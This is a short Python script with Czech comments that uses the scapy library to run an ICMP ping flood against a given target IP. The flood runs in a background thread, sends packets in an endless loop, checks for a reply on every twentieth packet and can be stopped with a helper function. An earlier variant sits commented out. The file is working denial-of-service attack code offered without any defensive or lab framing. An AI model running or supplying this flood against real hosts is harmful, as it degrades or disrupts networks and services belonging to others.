import threading
from scapy.all import IP, ICMP, sr1, send
import time

# Funkce pro odesílání nekonečného množství pingů a vypisování výsledků
def ping_flood(target_ip):
    # Proměnná pro kontrolu běhu smyčky
    global running
    running = True

    # # Funkce pro pingflood
    # def send_pings():
    #     while running:
    #         # Vytvoření ICMP (ping) zprávy
    #         packet = IP(dst=target_ip)/ICMP()
    #         try:
    #             # Odešli paket a čekej na odpověď
    #             response = sr1(packet, verbose=False, timeout=1) 
    #             if response:
    #                 print(f"Odpověď od {response.src}: {response.summary()}")
    #             else:
    #                 print(f"Žádná odpověď od {target_ip}")
    #         except Exception as e:
    #             print(f"Chyba při odesílání paketu: {e}")
    
    def send_pings():
        counter = 0
        while running:
            packet = IP(dst=target_ip)/ICMP()
            try:
                if counter % 20 == 0:  # Každý 20. paket se bude čekat na odpověď
                    response = sr1(packet, verbose=False, timeout=1)
                    if response:
                        print(f"Odpověď od {response.src}: {response.summary()}")
                    else:
                        print(f"Žádná odpověď od {target_ip}")
                else:
                    send(packet, verbose=False)
                
                counter += 1
            except Exception as e:
                print(f"Chyba při odesílání paketu: {e}")


    # Vytvoření vlákna pro odesílání pingů
    ping_thread = threading.Thread(target=send_pings)
    ping_thread.start()

    return ping_thread

# Funkce pro zastavení ping floodu
def stop_flood(ping_thread):
    global running
    running = False
    ping_thread.join()